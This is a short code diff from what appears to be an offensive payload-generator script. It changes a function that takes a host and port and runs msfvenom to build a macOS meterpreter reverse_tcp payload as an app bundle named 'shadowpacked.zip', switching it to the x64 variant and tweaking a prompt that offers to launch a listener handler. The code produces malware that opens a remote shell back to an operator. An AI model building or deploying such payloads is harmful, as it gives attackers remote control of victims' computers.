@@ -13,7 +13,7 @@ def payloadGenerator(mode):
 	    host = input("─────────╼┤HOST├─> ")
 	    port = input("─────────╼┤PORT├─> ")
 	    print("\n")
-	    command = "sudo msfvenom -p osx/meterpreter/reverse_tcp_uuid LHOST="+host+" LPORT="+port+" -f osx-app -o shadowpacked.zip"
+	    command = "sudo msfvenom -p osx/x64/meterpreter/reverse_tcp_uuid LHOST="+host+" LPORT="+port+" -f osx-app -o shadowpacked.zip"
 	    os.system(command)
         
     elif mode == "2":
@@ -25,7 +25,7 @@ def payloadGenerator(mode):
         os.system(command)
         
     print("\n")
-    handler = input("────╼┤LAUNCH HANDLER?(Y/n)├─> ")
+    handler = input("─╼┤HANDLER?(Y/n)├─> ")
     if handler == "y":
         launchHandler()
     elif handler == "Y":
